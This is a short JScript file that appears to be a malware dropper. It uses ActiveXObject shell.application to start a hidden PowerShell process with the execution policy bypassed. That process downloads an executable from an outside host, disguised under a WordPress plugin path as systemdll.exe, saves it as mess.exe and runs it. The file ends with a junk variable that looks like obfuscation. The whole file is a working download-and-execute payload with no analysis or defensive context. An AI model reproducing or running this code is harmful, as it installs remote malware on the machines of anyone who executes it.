var objShell = new ActiveXObject("shell.application");
var url = "http://brucetang.com/wp-content/plugins/libravatar-replace/systemdll.exe";

objShell.ShellExecute("PowerShell.exe", "-ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('"+url+"','mess.exe');(New-Object -com Shell.Application).ShellExecute('mess.exe');", "", "open", 1);
var xVkKeu = 24365;